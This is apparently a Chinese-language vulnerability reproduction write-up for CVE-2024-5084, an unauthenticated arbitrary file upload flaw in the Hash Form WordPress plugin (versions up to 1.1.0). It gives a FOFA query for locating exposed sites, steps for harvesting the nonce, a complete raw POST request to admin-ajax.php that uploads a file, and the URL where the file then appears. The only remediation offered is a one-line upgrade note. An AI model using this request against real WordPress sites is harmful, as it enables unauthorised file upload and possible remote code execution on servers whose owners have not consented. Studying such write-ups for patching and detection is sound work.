**漏洞名称**

WordPress的Hash表单任意文件上传漏洞

**漏洞影响**

<= 1.1.0 版本

**漏洞描述**

WordPress的Hash表单 - 拖放表单构建器插件由于在所有版本中缺失'file_upload_action'函数中的文件类型验证，存在任意文件上传漏洞，包括1.1.0版本。这使得未经身份验证的攻击者可以在受影响站点的服务器上上传任意文件，可能导致远程代码执行。

**FOFA搜索语句**

```
"/wp-content/plugins/hash-form/"
```

**漏洞复现**

第一步，请求目标网站，从body中获取ajax_nounce的值

![图片](CVE-2024-5084%20WordPress%E7%9A%84Hash%E8%A1%A8%E5%8D%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/640.png)



第二步，上传文件，路径中file_uploader_nonce用第一步获取到的值，qqfile为上传文件名5a499f6e26313e19bd4049009bbed5bd为上传文件内容

```yaml
POST /wp-admin/admin-ajax.php?action=hashform_file_upload_action&file_uploader_nonce=5ec33b3537&allowedExtensions%5B0%5D=txt&sizeLimit=1048576&qqfile=YwlKW.txt HTTP/1.1 
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0
Connection: close
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: request_a_quote_user_coockie=668e50f1d574c; PHPSESSID=6ltqhpjj2f7ciavd9s8dvh1i0e
Accept-Encoding: gzip

5a499f6e26313e19bd4049009bbed5bd
```



第三步，查看回显文件

```
http://x.x.x.x/wp-content/uploads/hashform/temp/YwlKW.txt
```



![图片](CVE-2024-5084%20WordPress%E7%9A%84Hash%E8%A1%A8%E5%8D%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/640-1720669159369-3.png)

漏洞复现成功

**修复建议**

升级到最新版本。